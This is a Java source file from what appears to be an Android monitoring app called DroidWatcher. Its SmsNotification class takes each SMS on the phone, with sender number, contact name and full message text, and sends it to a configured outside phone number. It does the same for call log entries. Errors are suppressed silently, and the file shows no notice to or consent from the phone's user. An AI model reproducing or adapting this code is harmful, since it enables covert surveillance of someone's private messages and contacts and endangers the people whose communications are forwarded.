package com.droidwatcher;

import java.util.ArrayList;

import org.acra.ACRA;

import com.droidwatcher.lib.Call;
import com.droidwatcher.lib.IMessageBody;
import com.droidwatcher.lib.SMS;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class SmsNotification {
	private Context mContext;
	private String mNotifyNumber;
	private Boolean mNotifySms;
	private Boolean mNotifyCall;
	
	private static final String[] DIRECTION = new String[]{ "", "in", "out", "missed" };
	
	public SmsNotification(Context context){
		this.mContext = context;
		
		SettingsManager settings = new SettingsManager(context);
		this.mNotifyNumber = settings.notifyNumber();
		this.mNotifySms = settings.notifySms();
		this.mNotifyCall = settings.notifyCall();
	}
	
	public Boolean notifySms(){
		return mNotifySms && mNotifyNumber.length() > 0;
	}
	
	public Boolean notifyCall(){
		return mNotifyCall && mNotifyNumber.length() > 0;
	}
	
	public void sendSmsLog(ArrayList<IMessageBody> list){
		if (list.size() == 0) {
			return;
		}
		
		SMS obj;
		String text;
		for (IMessageBody el : list) {
			try {
				obj = (SMS) el;
				if (obj.type > 3){
					obj.type = 0;
				}
				text = "[sms " + obj.getStringDate() + " " + DIRECTION[obj.type] + "] "
					+ obj.number + " ("
					+ obj.name + ") "
					+ obj.text;
				
				sendSms(text, mNotifyNumber);
				
			} catch (Exception e) {
				ACRA.getErrorReporter().handleSilentException(e);
				Debug.exception(e);
			}
		}
	}
	
	public void sendCallLog(ArrayList<IMessageBody> list){
		if (list.size() == 0) {
			return;
		}
		
		Call obj;
		String text;
		for (IMessageBody el : list) {
			try {
				obj = (Call) el;
				if (obj.type > 3){
					obj.type = 0;
				}
				text = "[call " + obj.getStringDate() + " " + DIRECTION[obj.type] + "] "
					+ obj.number + " ("
					+ obj.name + ") "
					+ obj.duration + "s.";
				
				sendSms(text, mNotifyNumber);
				
			} catch (Exception e) {
				ACRA.getErrorReporter().handleSilentException(e);
				Debug.exception(e);
			}
		}
	}
	
	private void sendSms(String text, String number){
		sendSms(mContext, text, number);
	}

	public static void sendSms(Context context, String text, String number){
		if (text == null || number == null) {
			return;
		}
		
		if (text.length() == 0 || number.length() == 0) {
			return;
		}
		
		Debug.i("Message: " + text + "; Number: " + number);
		
		try {
			SmsManager smsManager = SmsManager.getDefault();
			PendingIntent pi = PendingIntent.getBroadcast(context, 0, new Intent("DW_SMS_SENT"), 0);

			ArrayList<String> parts = smsManager.divideMessage(text);
			
			if (parts.size() == 0) {
				return;
			}
			
			if (parts.size() == 1) {
				smsManager.sendTextMessage(number, null, parts.get(0), pi, null);
			}
			else{
				ArrayList<PendingIntent> pendingIntents = new ArrayList<PendingIntent>(1);
				pendingIntents.add(pi);
				smsManager.sendMultipartTextMessage(number, null, parts, pendingIntents, null);
			}
			
		} catch (Exception e) {
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
}
